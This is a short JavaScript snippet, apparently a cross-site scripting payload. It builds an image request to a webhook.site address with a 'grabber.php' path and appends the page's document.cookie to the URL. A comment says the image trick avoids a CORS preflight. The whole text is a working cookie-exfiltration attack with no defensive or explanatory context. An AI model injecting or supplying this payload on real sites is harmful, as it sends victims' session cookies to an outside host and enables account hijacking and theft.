// Using image to avoid CORS preflight
const img = new Image();
img.src = 'https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972/XSS/grabber.php?c=' + encodeURIComponent(document.cookie);